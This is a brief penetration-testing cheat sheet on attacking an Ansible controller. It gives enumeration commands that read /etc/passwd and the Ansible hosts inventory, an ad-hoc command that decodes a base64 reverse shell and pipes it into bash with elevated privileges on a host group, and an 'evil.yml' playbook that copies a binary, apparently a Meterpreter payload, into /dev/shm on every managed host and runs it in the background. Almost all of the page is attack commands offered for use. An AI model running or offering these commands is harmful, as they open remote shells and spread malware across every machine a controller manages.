# Ansible




## Enumeration

When on ansible controller:

```
$ cat /etc/passwd | grep ans
$ cat /etc/ansible/hosts
$ ansible --version
```




## Execute Code

Using ad-hoc commands:

```
$ ansible <GROUP_NAME> -m shell -a "echo <BASE64_REVERSE_SHELL>|base64 -d|/bin/bash" --become
```

Malicious playbook example:

{% code title="evil.yml" %}
```yaml
# ansible-playbook evil.yml
- name: Evil playbook
  hosts: all
  gather_facts: true
  tasks:
    - name: upload
      copy:
        src: /tmp/met
        dest: /dev/shm/met
        mode: a+x
    - name: execute
      shell: "nohup /dev/shm/met &"
      async: 10
      poll: 0
```
{% endcode %}
